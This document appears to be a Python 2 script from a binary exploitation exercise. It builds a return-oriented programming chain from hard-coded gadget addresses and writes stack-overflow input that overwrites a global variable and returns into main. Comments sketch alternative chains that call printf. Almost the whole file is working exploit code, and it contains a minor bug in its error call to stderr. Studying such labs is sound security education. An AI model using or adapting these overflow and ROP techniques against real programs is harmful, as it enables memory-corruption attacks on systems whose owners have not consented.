#! /usr/bin/python2
from sys import stdout, stderr

stdout.write("Six factorial is %d.      \x00\n")  # To be read into `plaintext`

# Note payload cannot contain ord("\n")

# Printf test
# payload = [0x00000000] * 6 + [
#     0x80512e0,  # printf address
#     0x0805ebf9, # pop edx; pop ebx; ret;
#     0x80e6ce0, # plaintext  #0x80b40a4, # format string
#     125, # argument to printf %d argument
#     0x080507f0,  # exit address
# ]
"""
We can use 125 to a register value if we can put 
4 push in one ROP. prop number, plaintex, ROP with 3 pops, and printf address
Before:
reg1: value for printing
pop reg2
&format_string
pop reg3
&rop with 4 pops
pop reg4
&printf
rop with push reg1; push reg2; push reg3; push reg4; ret
&exit

After: the push rop
&printf
&rop with 3 pops
&format
val
rop with push reg1; push reg2; push reg3; push reg4; ret
&exit


Or we can do 
push reg 1; sub esp 0x4

and then

add esp 0x12

ROPS
0x0806098b: add esp, 4; pop ebx; pop esi; pop edi; pop ebp; ret; 
0x0804af56: add esp, 4; pop ebx; pop esi; ret; 
0x08066da2: add esp, 0xc; ret; 

"""

# Print the value of GLB using main.
payload = [0x00000000] * 6 + [
    0x0805ebf9,  # pop edx; pop ebx; ret;
    0x80e6cc0,  # &glb
    0x0,  # Dummy (put in ebx)
    0x080b054a,  # pop eax; ret;
    42,  # Value to store in eax
    0x0805f932,  # mov dword ptr [edx], eax; ret;

    0x080b2643,  # pop ebx; ret;
    0x80e5000,  # $ebx at start of concatenate strings
    0x08049859,  # pop ebp; ret;
    0xffffd018,  # original ebp
    0x08049eed,  # the return address in main
    # 0x8049eb7,  # the return address in main
    # 0x08049efc,  # the address before the final call to printf in main
]

#            &i   - &buffer
len_buffer = 0x28 - 0x1c

# Write our required return address and data to the stack
byte_mask = (0b1 << 8) - 1
i = 0
for word in payload:
    assert (word >> 32) == 0  # 4 byte address
    for j in range(4):
        byte = word & byte_mask
        if byte == ord("\n"):
            stderr("Cannot write 0x0a to the stack (i.e. a newline), change valu number ", i)
        if not (i == len(payload) - 1 and j == 3):
            stdout.write(chr(byte) + "B" * (len_buffer - 1) + "\x00\x00\x00")
        else:
            stdout.write(chr(byte) + "B" * (len_buffer - 1) + "\x09\x00\x00")
        word >>= 8
    i += 1

stdout.flush()
